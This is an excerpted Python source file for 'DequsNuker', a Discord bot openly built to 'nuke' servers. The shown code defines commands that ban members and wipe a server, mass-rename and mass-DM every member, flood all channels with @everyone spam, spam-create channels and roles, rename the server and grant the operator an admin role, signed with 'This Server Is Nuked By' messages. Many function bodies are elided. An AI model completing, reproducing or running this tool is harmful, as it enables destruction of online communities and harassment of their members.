...
req = requests.get("https://github.com/DESTR0JER/DequsNuker")
print(req)
...
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        ...
        "error": f"{colors['white']}[{colors['red']}x{colors['white']}]",
        "input": f"{colors['white']}{colors['red']}>>{colors['white']}",
...
print(f'{colors["red"]}\n\n                 ██████╗░███████╗░██████╗░██╗░░░██╗░██████╗     ' + "\n"
      ...
      "\n"
      "\n"
      f"{colors['white']}                           Author: {colors['red']}DequsGaming#9084\n"
      f"{colors['white']}                           Version: {colors['red']}1.1.1\n"
      f"{colors['white']}                           GitHub: {colors['red']}https://github.com/DESTR0JER/DequsNuker\n\n{colors['white']}")
...
while 1:
    try:
        ...
        start = input(f'{msgs["info"]} Do you want to load config? if you want to start over, press "n" [y/n] ')
        if start == "n":
            os.system('del config.json')
            print(f'{msgs["info"]} Config deleted successfully')
            print()
            continue
        elif start == "y":
            print()
        else:
            print(f'{msgs["error"]} I dont understand please try again')
        password = input(
            f'{msgs["info"]} Please type your password (if you dont remembre please delete config.json and start over) {msgs["input"]} ')
        if password == config["password"]:
            print(f'{msgs["info"]} Password is correct!')
        else:
            print(f'{msgs["error"]} Password is incorrect! Please try again!')
            continue
        token = config["token"]
        ...
        if len(token) != 59:
            print(f'{msgs["error"]} Your bot token is incorrect please try again')
            continue
        prefix = input(f"Paste prefix {msgs['input']} ")
        if len(prefix) < 1:
            print(f'{msgs["error"]} Your prefix is incorrect please try again')
            continue
        owners = input(
            f"Paste bot's owner ID (If several use ',') {msgs['input']} ")
        if len(owners) != 18:
            print(f'{msgs["error"]} Your owner ID is incorrect please try again')
            continue
        password = input(
            f"Think of a password that you will use to log in (if you do not want a password, press enter) {msgs['input']} "
        )
    ...
    if userOrBot() == True:
        print(f"{msgs['info']} DequsNuker doesn't support self bots now, it will likely be added in next versions")
    ...
    async def help(ctx):
        ...
        embed.set_author(name="DequsNuker",
                         url="https://github.com/DESTR0JER/DequsNuker")
        embed.add_field(
        ...
        embed.add_field(name="\u200b\nInfo",
                        value=f">>> **DequsNuker**\nMade by <@590625498309066769>\nVersion: 1.1.0 \nGitHub: https://github.com/DESTR0JER/DequsNuker\n", inline=False)
    ...
    @commands.check(isOwner)
    async def settingsActivity(ctx, action, activityType="playing", *, text=f"DequsNuker v1.1.0"):
        global config
        global activity
        if action == "set":
    ...
    @commands.check(isWhitelisted)
    async def nuke(ctx, ban: bool = True, text: str = "DequsNuker"):
        await msg_delete(ctx)
        ...
        try:
            ...
            embed.add_field(name="Serwer Został Znukowany",
                            value="By DequsNuker", inline=False)
            channel = await ctx.guild.create_text_channel(name="DequsNuker")
    ...
    @commands.check(isWhitelisted)
    async def renameEveryone(ctx, *, name="DequsNuker"):
        await msg_delete(ctx)
        for m in ctx.guild.members:
            if m.id not in owners:
                try:
    ...
    @commands.check(isWhitelisted)
    async def dmEveryone(ctx, *, msg="DequsNuker"):
        await msg_delete(ctx)
        for m in ctx.guild.members:
            if m.id not in owners:
                try:
    ...
    @commands.check(isWhitelisted)
    async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone DequsNuker"):
        await msg_delete(ctx)
    ...
    @commands.check(isWhitelisted)
    async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone DequsNuker"):
        await msg_delete(ctx)
        for i in range(amount):
            try:
    ...
    @commands.check(isWhitelisted)
    async def spamWithChannels(ctx, amount: int = 25, *, name="DequsNuker"):
        await msg_delete(ctx)
        for i in range(amount):
            try:
    ...
    @commands.check(isWhitelisted)
    async def spamWithRoles(ctx, amount: int = 25, *, name="DequsNuker"):
        await msg_delete(ctx)
        for i in range(amount):
            try:
    ...
    @commands.check(isWhitelisted)
    async def editServerName(ctx, *, name="DequsNuker"):
        await msg_delete(ctx)
        try:
    ...
    @commands.check(isWhitelisted)
    async def getAdmin(ctx, *, rolename="DequsNuker"):
        await msg_delete(ctx)
        try:
    ...
    async def reviveGuild(ctx, guildId: int = None):
        if guildId:
            ...
            try:
                await guild.create_text_channel(name="DequsNuker")
                print(f"{msgs['+']} Revived {guild}")
            except:
                print(f"{msgs['error']} Can't revive {guild}")

    @bot.command(name='16', aliases=["info"])
    @commands.check(isWhitelisted)
    async def spamInfo(ctx, amount: int = 50, *, text="@everyone This Server Is Nuked By: DequsNuker"):
        await msg_delete(ctx)
        for i in range(amount):
            try:
                await ctx.channel.send(text)
